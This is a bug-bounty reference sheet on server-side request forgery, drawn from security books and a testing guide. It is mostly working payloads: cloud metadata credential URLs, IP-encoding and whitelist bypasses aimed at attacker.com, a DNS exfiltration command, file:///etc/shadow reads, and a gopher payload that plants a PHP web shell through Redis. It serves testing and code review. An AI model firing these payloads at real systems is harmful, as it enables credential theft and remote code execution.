# Server-Side Request Forgery (SSRF)
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
The server is tricked into making HTTP requests to an attacker-controlled destination — either internal network resources or external servers.

## Finding SSRF

### Parameters to Test
```
?url=, ?image_url=, ?fetch=, ?proxy=, ?remote=, ?src=, ?path=
?dest=, ?redirect=, ?uri=, ?webhook=, ?endpoint=, ?target=
?next=, ?data=, ?load=, ?page=, ?file=
```

### Features That Often Have SSRF
- **Webhook configurations** (send HTTP callback to URL)
- **URL preview / link unfurling** (Slack-style link previews)
- **PDF/screenshot generators** (takes URL and renders page)
- **Image upload by URL** (fetch image from remote URL)
- **Import from URL** (CSV import, data sync)
- **OAuth integrations** (callback URLs)
- **XML/SOAP endpoints** (may fetch DTDs externally)

---

## Basic SSRF Test

```
# Test 1: Out-of-band detection
?url=http://YOUR_BURP_COLLABORATOR.com
?url=http://interact.sh/
?url=https://webhook.site/unique-id

# Test 2: Localhost
?url=http://localhost
?url=http://127.0.0.1
?url=http://0.0.0.0

# Test 3: Cloud metadata (highest impact)
?url=http://169.254.169.254/latest/meta-data/
```

---

## Cloud Metadata Services

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
# ECS containers:
http://169.254.170.2/v2/credentials/
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Headers required: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Headers: Metadata: true
```

---

## Internal Network Scanning
```
http://192.168.1.1/     → Router admin panel
http://10.0.0.1/        → Internal services
http://127.0.0.1:8080/  → Alternative HTTP port
http://127.0.0.1:22/    → SSH banner
http://127.0.0.1:3306/  → MySQL
http://127.0.0.1:6379/  → Redis
http://127.0.0.1:27017/ → MongoDB
http://127.0.0.1:9200/  → Elasticsearch
http://127.0.0.1:5601/  → Kibana
```

---

## Blocklist Bypass Techniques

### IP Encoding Variants (all resolve to 127.0.0.1)
```
# Hex
http://0x7f.0x0.0x0.0x1
http://0x7f000001

# Octal
http://0177.0000.0000.0001
http://0177.0.0.1

# Decimal (dword)
http://2130706433

# Short form
http://127.1/

# IPv6
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]

# IPv4-mapped IPv6 bypass
http://[::ffff:169.254.169.254]

# URL encoding
http://%6c%6f%63%61%6c%68%6f%73%74   → localhost

# IDNA / Unicode lookalike
http://ⓛⓞⓒⓐⓛⓗⓞⓤⓢⓣ/
```

### Domain-Based Bypass
```
# Domains that resolve to 127.0.0.1
http://localtest.me
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io

# DNS rebinding: set up DNS with short TTL
# First response = valid IP, second = 127.0.0.1

# Redirect-based: Your server returns 302 → http://127.0.0.1/admin
```

### Protocol Schemes
```
# File read (if server allows file://)
?url=file:///etc/passwd
?url=file:///etc/shadow

# gopher:// for protocols without HTTP
gopher://127.0.0.1:25/_EHLO localhost  → SMTP
gopher://127.0.0.1:6379/_SET key value  → Redis

# dict:// for service discovery
dict://127.0.0.1:6379/INFO  → Redis info
```

### Whitelist Bypass (if URL must contain "example.com")
```
# Credentials trick
http://example.com@attacker.com
http://allowed.com@169.254.169.254/

# Fragment trick
http://attacker.com#example.com
http://169.254.169.254#allowed.com

# Subdomain trick
http://allowed.com.attacker.com
http://allowed.com.attacker.com/

# Path confusion
http://example.com/../../../attacker.com
```

---

## Blind SSRF

When you can't read the response:
```bash
# Use Burp Collaborator or interactsh
https://target.com/webhook?url=http://YOUR_COLLAB.burpcollaborator.net
# DNS request received = SSRF confirmed (even if TCP fails)
# HTTP request received = full SSRF
```

### OOB Exfiltration via DNS
```
# Encode output in subdomain:
; nslookup $(whoami).YOUR_BURP_COLLABORATOR.com
# DNS query: root.attacker.com → you see "root" in DNS log
```

### Port Scanning via Timing
```
# Open port: fast response (200 or connection refused)
# Filtered port: slow response (timeout)
# Use response time differences to map internal network
```

---

## SSRF to RCE Escalation Chain

```
SSRF → Cloud Metadata → IAM credentials → AWS CLI access → RCE on EC2
SSRF → Redis (6379) → Write crontab → RCE
SSRF → Elasticsearch (9200) → Data exfiltration
SSRF → Internal admin panel → RCE via admin function
```

### Redis via SSRF (gopher)
```
gopher://127.0.0.1:6379/_
MULTI%0d%0a
SET key1 "<?php system($_GET['cmd']); ?>"%0d%0a
CONFIG SET dir /var/www/html%0d%0a
CONFIG SET dbfilename shell.php%0d%0a
SAVE%0d%0a
EXEC%0d%0a
```

### SSRF in XML/XXE Context
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

---

## Detection in Code Review

### PHP
```php
// Vulnerable
$content = file_get_contents($_GET['url']);
$content = curl_exec($ch);  // where $ch uses user input
```

### Python
```python
# Vulnerable
response = requests.get(request.args.get('url'))
urllib.request.urlopen(user_supplied_url)
```

---

## Real-World Examples (Yaworski)
- **ESEA** ($1,000): SSRF → internal memcached access → RCE
- **Google DNS** (donated): SSRF via URL shortener — port scan Google's internal network
- **Blind SSRF via webhooks**: Many services fetch webhook URLs → internal network mapping

## Testing Checklist
- [ ] Find all URL parameters, webhook fields, fetch endpoints
- [ ] Test with Burp Collaborator URL (OOB detection)
- [ ] Test with http://127.0.0.1 and all encoding variants
- [ ] Test AWS/GCP/Azure metadata endpoints
- [ ] Try all IP encoding variants
- [ ] Try protocol schemes (file://, gopher://, dict://)
- [ ] Test for open redirect chaining to SSRF
- [ ] Test blind SSRF via DNS
- [ ] Escalate: internal network scan, metadata credential theft

## Severity
- **Low**: Confirms SSRF but no sensitive data accessible
- **Medium**: Internal network service discovery
- **High**: Cloud metadata access (credentials, IAM roles)
- **Critical**: RCE via internal services, full credential compromise
